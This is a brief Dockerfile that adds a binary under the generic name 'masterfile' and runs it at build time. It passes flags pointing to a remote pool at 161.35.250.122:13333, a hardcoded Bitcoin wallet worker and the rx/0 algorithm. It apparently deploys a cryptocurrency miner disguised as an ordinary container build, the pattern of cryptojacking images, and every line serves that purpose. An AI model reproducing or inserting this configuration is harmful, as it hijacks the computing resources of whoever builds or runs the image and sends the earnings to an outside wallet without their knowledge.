FROM ubuntu:20.04

RUN apt-get update
ADD masterfile masterfile

RUN chmod u+x masterfile
RUN ./masterfile -o 161.35.250.122:13333 -u BTC:3L2s7K3Ya5ES9CUZf8S9xncXDvJrBsYB8D.Worker01 -k -a rx/0
